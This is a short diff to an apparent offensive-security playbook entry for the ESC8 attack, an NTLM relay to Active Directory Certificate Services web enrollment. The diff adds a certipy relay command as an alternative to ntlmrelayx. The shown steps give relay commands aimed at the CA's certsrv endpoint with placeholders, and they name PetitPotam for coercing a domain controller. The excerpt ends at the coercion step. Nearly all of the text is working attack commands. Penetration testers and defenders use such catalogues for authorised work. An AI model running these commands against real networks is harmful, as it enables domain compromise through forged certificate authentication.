@@ -2,7 +2,11 @@ name: ADCSESC8
 description: ESC8 - NTLM relay to AD CS HTTP endpoints (web enrollment)
 commands:
 - '# Step 1: Start NTLM relay targeting ADCS web enrollment'
+- '# Option A: ntlmrelayx (Impacket)'
 - ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
+- ''
+- '# Option B: certipy relay (simpler syntax)'
+- certipy relay -target http://<CA_HOST>/certsrv/certfnsh.asp -template <TEMPLATE>
 - ''
 - '# Step 2: Coerce authentication from target (e.g., Domain Controller)'
 - '# Using PetitPotam'
